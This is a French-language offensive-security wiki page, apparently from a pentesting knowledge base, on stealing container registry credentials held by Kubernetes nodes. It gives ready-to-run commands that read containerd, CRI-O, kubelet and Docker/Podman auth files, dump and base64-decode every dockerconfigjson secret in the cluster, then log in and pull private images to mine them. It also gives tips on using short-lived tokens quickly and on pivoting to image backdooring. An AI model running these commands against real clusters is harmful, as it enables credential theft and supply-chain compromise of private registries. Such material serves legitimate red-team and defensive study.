---
title: "Vol de secret de pull d'image : dérober les identifiants de registre détenus par un nœud"
description: "Les runtimes de nœud stockent les identifiants utilisés pour pull les images, dans la configuration de containerd et de CRI-O, dans les secrets de pull fusionnés du kubelet et dans les secrets dockerconfigjson de Kubernetes. Un attaquant sur le nœud ou disposant d'un accès au runtime les lit pour s'authentifier auprès de registres privés, pour pull des images propriétaires et les secrets qu'elles contiennent."
keywords:
  - secret de pull d'image
  - dockerconfigjson
  - identifiants de registre
  - kubelet
  - registre privé
---

# Vol de secret de pull d'image

Pour pull des images privées, un nœud doit détenir des identifiants de registre, et ces identifiants se trouvent à des emplacements prévisibles : la configuration propre au runtime, la vue par le kubelet des secrets de pull d'image d'un pod, et les objets secrets `dockerconfigjson` de Kubernetes. Les dérober donne un accès au registre, ce qui fournit des images privées et les secrets qu'elles contiennent, étendant un point d'ancrage sur le nœud vers la supply chain.

## Où résident les identifiants

```bash
# containerd registry auth (host config or the legacy config.toml)
grep -ri -A3 'auth\|token\|password' /etc/containerd/config.toml \
  /etc/containerd/certs.d/*/hosts.toml 2>/dev/null
# CRI-O / cri auth file and the kubelet's merged config
cat /var/lib/kubelet/config.json 2>/dev/null
find /var/lib/kubelet -name 'config.json' -o -name '*.dockercfg' 2>/dev/null
# the node-wide docker/podman auth files
cat /root/.docker/config.json /run/user/*/containers/auth.json 2>/dev/null
# Kubernetes image-pull secrets, if the API is reachable with a token
kubectl get secret -A -o jsonpath='{range .items[?(@.type=="kubernetes.io/dockerconfigjson")]}{.metadata.namespace}/{.metadata.name}: {.data.\.dockerconfigjson}{"\n"}{end}' \
  | while read n b; do echo "$n"; echo "$b" | base64 -d; done
```

## Utiliser les identifiants

```bash
# the auth value is base64 user:token, not encryption
echo "<auth-string>" | base64 -d
docker login <registry> -u <user> -p <token>
docker pull <registry>/<private-repo>:<tag>          # then mine layers for more secrets
```

## Notes d'exploitation

- Tous ces fichiers stockent les identifiants en base64, qui est un encodage ; le décodage donne directement le nom d'utilisateur et le token du registre.
- Les identifiants de registres cloud sont souvent des tokens à courte durée de vie rafraîchis par un helper, utilisez-les donc rapidement ; les mots de passe de registre statiques persistent et constituent la trouvaille la plus durable.
- L'accès au registre est un point d'ancrage dans la supply chain : pull des images privées et extrayez les secrets qui y sont intégrés via [Secrets dans les couches d'image](../docker/images-and-registries/secrets-in-image-layers.md), et envisagez un périmètre d'écriture pour [Backdooring d'image](../docker/images-and-registries/image-backdooring.md).

## Références

- [Kubernetes: pull image from a private registry](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/)
- [containerd: registry configuration](https://github.com/containerd/containerd/blob/main/docs/hosts.md)
- [HackTricks: Kubernetes secrets](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
